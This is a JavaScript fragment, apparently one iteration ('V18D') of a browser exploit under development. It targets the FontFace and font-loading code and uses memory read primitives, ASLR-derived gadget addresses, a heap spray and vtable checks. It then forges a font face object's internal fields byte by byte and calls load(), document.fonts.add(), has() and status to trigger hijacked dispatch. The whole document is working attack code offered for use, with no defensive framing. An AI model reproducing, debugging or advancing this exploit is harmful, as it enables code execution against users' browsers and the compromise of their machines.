// V18D Patch: Pre-Load Validation + Alternative Dispatch
// V18C still crashes - need to validate face object and try alternative dispatch

/* ==== V18D: PRE-LOAD VALIDATION + ALTERNATIVE DISPATCH ====
 *
 * V18C FINDING: Even with all fields crafted, load() still crashes.
 * This means the problem is deeper than invalid field pointers.
 *
 * V18D:
 * 1. Validates face object BEFORE load() (vtable, size, memory)
 * 2. Tries alternative dispatch: document.fonts.add() instead of load()
 * 3. Tests if the issue is the load() path itself
 */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V18D-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      /* ==== VALIDATION 1: Check face vtable ==== */
      bs('V18D-VALIDATE-VTABLE');

      /* Read the face's vtable pointer (at face+0x00) */
      var faceVtable=0n;
      for(var vb=0;vb<8;vb++)faceVtable|=BigInt(hitBuf[vb])<<BigInt(vb*8);
      bs('V18D-FACE-VTABLE='+hex(faceVtable));

      /* Compare with expected VP */
      if(faceVtable===VP){
        bs('V18D-VTABLE-MATCH-VP');
      }else{
        bs('V18D-VTABLE-MISMATCH-expect='+hex(VP));
      }

      /* ==== VALIDATION 2: Check face backing pointer ==== */
      bs('V18D-VALIDATE-BACKING');

      /* Read the face's backing pointer (at face+0x10) */
      var faceBacking=0n;
      for(var bb=0;bb<8;bb++)faceBacking|=BigInt(hitBuf[0x10+bb])<<BigInt(bb*8);
      bs('V18D-FACE-BACKING='+hex(faceBacking));

      /* Compare with SELF */
      if(faceBacking===S){
        bs('V18D-BACKING-MATCH-SELF');
      }else{
        bs('V18D-BACKING-MISMATCH-expect='+hex(S));
      }

      /* ==== VALIDATION 3: Check memory readability ==== */
      bs('V18D-VALIDATE-MEMORY');

      /* Try to read the entire face object */
      try{
        var faceH=readAt(S,0xC0);
        bs('V18D-MEMORY-READABLE-len='+faceH.length);
      }catch(e){
        bs('V18D-MEMORY-UNREADABLE-'+String(e&&e.message?e.message:'?'));
      }

      /* ==== VALIDATION 4: Check face wrapper identity ==== */
      bs('V18D-VALIDATE-WRAPPER');

      /* Read the wrapper's vtable (at FB+0x00) */
      var wrapperVtable=0n;
      var wrapperH=readAt(FB,8);
      wrapperVtable=qAt(wrapperH,0);
      bs('V18D-WRAPPER-VTABLE='+hex(wrapperVtable));

      if(wrapperVtable===VP){
        bs('V18D-WRAPPER-MATCH-VP');
      }else{
        bs('V18D-WRAPPER-MISMATCH');
      }

      /* ==== CRAFT FACE (same as V18C) ==== */
      bs('V18D-CRAFT-START');

      hitBuf[0x82]=0;  /* status = Pending */
      hitBuf[0x87]=1;  /* override = Block */
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      for(var sz=0x28;sz<=0x37;sz++)hitBuf[sz]=0;  /* empty sources */
      for(var i=0;i<8;i++)hitBuf[0x58+i]=0;  /* null table */
      hitBuf[0x60]=3; hitBuf[0x61]=0; hitBuf[0x62]=0; hitBuf[0x63]=0;
      hitBuf[0x64]=0; hitBuf[0x65]=2; hitBuf[0x66]=0; hitBuf[0x67]=0;
      for(var tz=0x88;tz<=0xBF;tz++)hitBuf[tz]=0;  /* timer zeroed */
      for(var pb=0;pb<8;pb++)hitBuf[0x18+pb]=0;  /* promise null */
      hitBuf[0x83]=1;  /* sourcesPopulated=1 */

      bs('V18D-CRAFT-COMPLETE');

      /* ==== TEST 1: load() (expected to crash) ==== */
      bs('V18D-TEST1-LOAD-PRE');
      try{
        faces[zi].load();
        bs('V18D-TEST1-LOAD-RETURNED');
      }catch(e){
        bs('V18D-TEST1-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
      }

      /* ==== TEST 2: document.fonts.add() (alternative dispatch) ==== */
      bs('V18D-TEST2-ADD-PRE');

      /* First, restore the original table pointer */
      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);

      try{
        document.fonts.add(faces[zi]);
        bs('V18D-TEST2-ADD-RETURNED');
      }catch(e){
        bs('V18D-TEST2-ADD-THREW-'+String(e&&e.message?e.message:'?'));
      }

      /* ==== TEST 3: Check if face is in the set ==== */
      bs('V18D-TEST3-CHECK-PRE');
      try{
        var hasFace=document.fonts.has(faces[zi]);
        bs('V18D-TEST3-HAS-FACE='+hasFace);
      }catch(e){
        bs('V18D-TEST3-CHECK-THREW-'+String(e&&e.message?e.message:'?'));
      }

      /* ==== TEST 4: Try to trigger dispatch via status read ==== */
      bs('V18D-TEST4-STATUS-PRE');
      try{
        var faceStatus=faces[zi].status;
        bs('V18D-TEST4-STATUS='+faceStatus);
      }catch(e){
        bs('V18D-TEST4-STATUS-THREW-'+String(e&&e.message?e.message:'?'));
      }

      /* Restore original table pointer */
      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
      bs('V18D-RESTORED');

      /* Verdict */
      verd('ok','V18D validation + alternative dispatch complete');
      bs('V18D-DONE');

    }else bs('V18D-SKIP-bad-idx');
  }else bs('V18D-SKIP-missing-data');
}catch(e18d){bs('V18D-ERR-'+String(e18d&&e18d.message?e18d.message:'?'));}
/* ==== V18D END ==== */
